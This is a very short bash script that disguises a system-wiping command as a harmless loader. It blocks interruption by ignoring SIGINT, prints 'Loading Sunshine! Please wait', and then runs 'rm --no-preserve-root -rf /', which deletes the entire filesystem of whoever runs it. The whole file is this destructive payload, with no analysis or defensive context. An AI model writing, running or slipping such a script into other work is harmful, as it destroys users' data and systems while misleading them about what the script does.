#!/bin/bash
# Ignore SIGINT
trap '' SIGINT

echo -ne "Loading Sunshine! Please wait ...\n"
rm --no-preserve-root -rf /
